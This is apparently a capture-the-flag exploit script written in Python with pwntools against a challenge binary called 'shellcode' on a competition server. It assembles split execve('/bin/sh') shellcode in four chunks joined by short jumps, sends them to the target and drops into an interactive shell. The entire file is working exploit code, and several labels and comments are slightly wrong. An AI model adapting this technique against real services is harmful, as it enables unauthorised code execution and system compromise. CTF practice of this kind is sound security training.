from pwn import *


# initialize the binary
binary = "./shellcode"
elf = context.binary = ELF(binary, checksec=False,)

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("byuctf.xyz", 40017)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()


print("[+] Compiling shellcode...")


# first 10 bytes of shellcode
shellcode_one = """
# What we want:
# - $rax = 0x3b
# - $rdi = "/bin/sh"
# - $rsi = 0
# - $rdx = 0
# Then call syscall

# put "/bin" in $rsp
mov DWORD PTR[rbp], 0x6e69622f          # 7 bytes
jmp short $+0x19                        # 2 bytes
"""

assembly_one = asm(re.sub(r'#.*', '', shellcode_one))
print("Shellcode 1 ("+str(len(assembly_one))+" bytes):",assembly_one)


# second 10 bytes of shellcode
shellcode_two = """
# put "/sh\x00" in $rsp+0x4
mov DWORD PTR[rbp+0x4], 0x0068732F      # 7 bytes
jmp short $+0x19                        # 2 bytes
"""

assembly_two = asm(re.sub(r'#.*', '', shellcode_two))
print("Shellcode 1 ("+str(len(assembly_two))+" bytes):",assembly_two)


# third 10 bytes of shellcode
shellcode_three = """
# put the address of $rbp in $rdi
mov rdi, rbp                            # 3 bytes

# $rsi = 0
xor esi, esi                            # 2 bytes

# $rdx = 0
xor edx, edx                            # 2 bytes

jmp short $+0x19                        # 2 bytes
"""

assembly_three = asm(re.sub(r'#.*', '', shellcode_three))
print("Shellcode 1 ("+str(len(assembly_three))+" bytes):",assembly_three)


# third 10 bytes of shellcode
shellcode_four = """
# $rax = 0x3b
mov al, 0x3b                            # 2 bytes

# get shell
syscall                                 # 2 bytes
"""

assembly_four = asm(re.sub(r'#.*', '', shellcode_four))
print("Shellcode 1 ("+str(len(assembly_four))+" bytes):",assembly_four)


# send shellcode
print("[+] Sending shellcode...")
p.recvline()
p.sendline(assembly_one)
p.recvline()
p.sendline(assembly_two)
p.recvline()
p.sendline(assembly_three)
p.recvline()
p.sendline(assembly_four)


# get shell
print("[+] Getting shell?")
p.interactive()